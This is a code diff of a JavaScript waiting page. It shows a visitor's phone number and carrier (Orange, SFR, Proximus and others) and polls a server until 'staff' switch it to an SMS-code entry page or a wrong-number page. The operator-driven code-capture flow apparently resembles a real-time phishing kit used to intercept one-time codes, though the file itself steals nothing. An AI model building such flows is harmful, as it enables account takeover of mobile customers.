@@ -1,8 +1,7 @@
 const API_STATUS = '/api/status';
 
 function getParam(name) {
-    const url = new URL(window.location.href);
-    return url.searchParams.get(name);
+    return new URL(window.location.href).searchParams.get(name);
 }
 
 const phone = getParam('phone') || '--';
@@ -10,14 +9,12 @@ const carrier = getParam('carrier') || 'Orange';
 
 document.getElementById('displayPhone').textContent = phone;
 
-// Mapping opérateur → nom affiché
 const carrierNames = {
     'orange': 'Orange', 'sfr': 'SFR', 'bouygues': 'Bouygues',
     'base': 'BASE', 'orange_be': 'Orange Belgique', 'proximus': 'Proximus', 'telenet': 'Telenet'
 };
 document.getElementById('carrierName').textContent = carrierNames[carrier] || carrier;
 
-// Polling du statut toutes les 3 secondes
 async function checkStatus() {
     try {
         const res = await fetch(`${API_STATUS}?phone=${encodeURIComponent(phone)}`);
@@ -25,8 +22,10 @@ async function checkStatus() {
         const data = await res.json();
 
         if (data.status === 'waiting_code') {
-            // Le staff a envoyé le code, on redirige
-            window.location.href = `code.html?phone=${encodeURIComponent(phone)}`;
+            const len = data.code_length || 6;
+            window.location.href = `code.html?phone=${encodeURIComponent(phone)}&length=${len}`;
+        } else if (data.status === 'wrong_number') {
+            window.location.href = `index.html?wrong_number=1`;
         } else if (data.status === 'completed') {
             window.location.href = `success.html?phone=${encodeURIComponent(phone)}`;
         }
@@ -35,6 +34,5 @@ async function checkStatus() {
     }
 }
 
-// Démarrer le polling
 checkStatus();
 setInterval(checkStatus, 3000);
